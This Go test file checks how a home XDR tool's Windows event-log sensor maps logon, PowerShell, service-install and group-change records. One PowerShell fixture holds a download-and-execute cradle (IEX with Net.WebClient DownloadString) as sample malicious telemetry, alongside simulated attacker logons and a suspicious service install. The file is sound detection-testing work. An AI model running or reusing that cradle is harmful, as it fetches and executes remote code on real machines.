//go:build windows

package windows

import (
	"context"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Netdoodle/homexdr/shared/api"
	"github.com/Netdoodle/homexdr/shared/event"
)

func TestEventLogLogonMapping(t *testing.T) {
	r := mustParse(t, securityXML(4625, 77, "2026-11-07T10:30:00Z", [][2]string{
		{"SubjectUserSid", "S-1-0-0"}, {"SubjectUserName", "-"}, {"SubjectDomainName", "-"},
		{"TargetUserSid", "S-1-0-0"}, {"TargetUserName", "administrator"}, {"TargetDomainName", "HX01"},
		{"LogonType", "3"}, {"WorkstationName", "KALI"}, {"IpAddress", "::ffff:192.168.20.50"}, {"IpPort", "51544"},
		{"Status", "0xc000006d"},
	}))
	e := mapEventLogRecord(r)
	if e.Event.Module != event.ModuleEventLog || e.Event.Dataset != "windows.security" || e.Event.Code != "4625" ||
		e.Event.Provider != "Microsoft-Windows-Security-Auditing" {
		t.Errorf("meta = %+v", e.Event)
	}
	if e.Event.Action != "logon_failed" || e.Event.Outcome != event.OutcomeFailure ||
		len(e.Event.Category) != 1 || e.Event.Category[0] != event.CategoryAuthentication {
		t.Errorf("auth meta = %+v", e.Event)
	}
	if e.User == nil || e.User.Name != "administrator" || e.User.Domain != "HX01" || e.User.ID != "" {
		t.Errorf("user = %+v", e.User)
	}
	if e.Source == nil || e.Source.IP != "192.168.20.50" || e.Source.Port != 51544 || e.Source.Domain != "KALI" {
		t.Errorf("source = %+v", e.Source)
	}
	// EventData stays verbatim for Sigma.
	if e.Data["LogonType"] != "3" || e.Data["SubjectUserName"] != "-" || e.Data["Channel"] != "Security" || e.Data["Status"] != "0xc000006d" {
		t.Errorf("data = %v", e.Data)
	}
	if e.Message != `logon failed: HX01\administrator (network from 192.168.20.50)` {
		t.Errorf("message = %q", e.Message)
	}

	// Local logons keep no source address.
	r = mustParse(t, securityXML(4624, 78, "2026-11-07T10:31:00Z", [][2]string{
		{"TargetUserSid", "S-1-5-18"}, {"TargetUserName", "SYSTEM"}, {"TargetDomainName", "NT AUTHORITY"},
		{"LogonType", "5"}, {"IpAddress", "-"}, {"IpPort", "-"},
	}))
	e = mapEventLogRecord(r)
	if e.Event.Outcome != event.OutcomeSuccess || e.Source != nil || e.User.ID != "S-1-5-18" {
		t.Errorf("4624: outcome %q source %+v user %+v", e.Event.Outcome, e.Source, e.User)
	}
}

func TestEventLogOtherMappings(t *testing.T) {
	// PowerShell script block: verbatim text, the logging process as process.pid.
	x := eventXML("Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational", 4104, 9, "2026-11-07T10:32:00Z", [][2]string{
		{"MessageNumber", "1"}, {"MessageTotal", "1"}, {"ScriptBlockText", "IEX (New-Object Net.WebClient).DownloadString('http://x')"},
		{"ScriptBlockId", "b1"}, {"Path", ""},
	})
	x = strings.Replace(x, "ProcessID='4'", "ProcessID='4242'", 1)
	e := mapEventLogRecord(mustParse(t, x))
	if e.Event.Dataset != "windows.powershell" || e.Message != "PowerShell script block" ||
		!strings.Contains(e.Data["ScriptBlockText"].(string), "DownloadString") {
		t.Errorf("4104: %+v %v", e.Event, e.Data)
	}
	if e.Process == nil || e.Process.PID != 4242 {
		t.Errorf("4104 process = %+v", e.Process)
	}

	// Service install from the System log.
	e = mapEventLogRecord(mustParse(t, eventXML("Service Control Manager", "System", 7045, 10, "2026-11-07T10:33:00Z", [][2]string{
		{"ServiceName", "updsvc"}, {"ImagePath", `C:\Users\Public\upd.exe`}, {"ServiceType", "user mode service"},
		{"StartType", "auto start"}, {"AccountName", "LocalSystem"},
	})))
	if e.Event.Dataset != "windows.system" || e.Service == nil || e.Service.Name != "updsvc" ||
		e.Service.StartType != "auto" || e.Event.Action != "service_installed" {
		t.Errorf("7045: %+v %+v", e.Event, e.Service)
	}

	// Group membership change.
	e = mapEventLogRecord(mustParse(t, securityXML(4732, 11, "2026-11-07T10:34:00Z", [][2]string{
		{"MemberName", "-"}, {"MemberSid", "S-1-5-21-1-2-3-1001"}, {"TargetUserName", "Administrators"},
		{"TargetDomainName", "Builtin"}, {"SubjectUserName", "alice"}, {"SubjectDomainName", "HX01"},
	})))
	if e.Event.Action != "group_member_added" || e.User == nil || e.User.Name != "alice" ||
		e.User.Target == nil || e.User.Target.ID != "S-1-5-21-1-2-3-1001" || !strings.HasSuffix(e.Message, ": Administrators") {
		t.Errorf("4732: %+v user %+v message %q", e.Event, e.User, e.Message)
	}
}

func TestEventLogDatasets(t *testing.T) {
	for ch, want := range map[string]string{
		"Security":           "windows.security",
		"Windows PowerShell": "windows.powershell-classic",
		"microsoft-windows-taskscheduler/operational": "windows.taskscheduler",
		"Microsoft-Windows-AppLocker/EXE and DLL":     "windows.applocker",
		"Some-Vendor/Admin Log":                       "windows.some-vendor_admin_log",
	} {
		if got := eventlogDataset(ch); got != want {
			t.Errorf("%q: %q, want %q", ch, got, want)
		}
	}
}

func TestChannelQuery(t *testing.T) {
	if q := channelQuery("System", true); q != "*" {
		t.Errorf("System: %q", q)
	}
	q := channelQuery("security", true)
	for _, id := range []string{"4688", "4689", "5156", "5379"} {
		if !strings.Contains(q, "EventID!="+id) {
			t.Errorf("Security query %q misses %s", q, id)
		}
	}
	if q := channelQuery("Security", false); strings.Contains(q, "4688") {
		t.Errorf("without the process sensor 4688 must be read: %q", q)
	}
	if q := channelQuery(sysmonChannel, true); q != "*[System[(EventID!=1 and EventID!=5)]]" {
		t.Errorf("Sysmon: %q", q)
	}
	if got := normalizeChannels([]string{" System", "system", "", "Security"}); len(got) != 2 || got[0] != "System" {
		t.Errorf("normalize = %q", got)
	}
}

// collectingEmitter keeps every event.
type collectingEmitter struct {
	mu  sync.Mutex
	evs []*event.Event
}

func (c *collectingEmitter) Emit(e *event.Event) {
	c.mu.Lock()
	c.evs = append(c.evs, e)
	c.mu.Unlock()
}

func (c *collectingEmitter) find(fn func(*event.Event) bool) *event.Event {
	c.mu.Lock()
	defer c.mu.Unlock()
	for _, e := range c.evs {
		if fn(e) {
			return e
		}
	}
	return nil
}

// TestEventLogSensorLive runs the sensor on the Application log (readable without
// elevation) plus a channel that does not exist, and checks a written record arrives
// mapped and the missing channel is only noted.
func TestEventLogSensorLive(t *testing.T) {
	env := testEnv(t)
	env.DataDir = filepath.Join(t.TempDir(), "data")
	s := newEventLogSensor(api.EventLogConfig{Enabled: true, Channels: []string{"Application", "HomeXDR-Missing/Operational"}}, true, env)
	out := &collectingEmitter{}
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() { done <- s.Run(ctx, out) }()
	defer func() {
		cancel()
		if err := <-done; err != nil {
			t.Errorf("Run: %v", err)
		}
	}()
	// Wait for the subscription (it starts at new records).
	deadline := time.Now().Add(10 * time.Second)
	for {
		s.chMu.Lock()
		p, ok := s.problems["Application"]
		s.chMu.Unlock()
		if ok && p == "" {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("Application not subscribed: %+v", s.Status())
		}
		time.Sleep(50 * time.Millisecond)
	}
	nonce := "hx-eventlog-" + strconv.FormatInt(time.Now().UnixNano(), 36)
	writeAppEvent(t, "HomeXDR-Test", nonce)
	var got *event.Event
	for deadline = time.Now().Add(15 * time.Second); got == nil && time.Now().Before(deadline); time.Sleep(100 * time.Millisecond) {
		got = out.find(func(e *event.Event) bool {
			d, _ := e.Data["Data"].([]string)
			return len(d) > 0 && d[0] == nonce
		})
	}
	if got == nil {
		t.Fatalf("record not delivered; status %+v", s.Status())
	}
	if got.Event.Dataset != "windows.application" || got.Event.Provider != "HomeXDR-Test" || got.Data["Channel"] != "Application" {
		t.Errorf("event = %+v data %v", got.Event, got.Data)
	}
	st := s.Status()
	if st.State != api.SensorRunning || !strings.Contains(st.Error, "not installed: HomeXDR-Missing/Operational") || st.Events == 0 {
		t.Errorf("status = %+v", st)
	}
}
